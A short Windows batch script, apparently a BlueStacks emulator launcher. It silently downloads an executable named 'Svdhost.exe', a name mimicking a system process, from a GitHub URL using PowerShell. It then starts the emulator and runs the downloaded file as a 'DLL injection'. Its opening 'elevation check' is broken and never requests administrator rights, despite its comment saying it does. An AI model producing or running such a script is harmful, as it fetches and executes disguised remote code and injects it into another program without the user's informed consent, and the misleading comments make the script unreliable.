@echo off
:: Check for elevated privileges
>nul 2>&1 set "ELEVATED=!ELEVATED!"
if not defined ELEVATED (
    :: Not elevated, relaunch as administrator
    echo Set "ELEVATED=1" & set "ELEVATED=1" & call "%~f0" %*
    exit /b
)

REM Define the path to the injector and the download URL
set "injectorPath=C:\Users\Public\BlueStacks\Svdhost.exe"
set "downloadURL=https://github.com/khawarahemad/Injecter/raw/main/Svdhost.exe"

REM Check if the injector exists
if not exist "%injectorPath%" (
    REM If not, download the injector silently
    powershell -Command "Invoke-WebRequest -Uri '%downloadURL%' -OutFile '%injectorPath%' -UseBasicParsing"
)

REM Start the MSI App Player in background mode
start "" "C:\Program Files\BlueStacks_msi5\HD-Player.exe"

REM Wait for the MSI App Player to fully load (adjust the timeout as needed)
timeout /t 22 /nobreak >nul

REM Start the DLL Injection in background mode
start "" "%injectorPath%"

exit
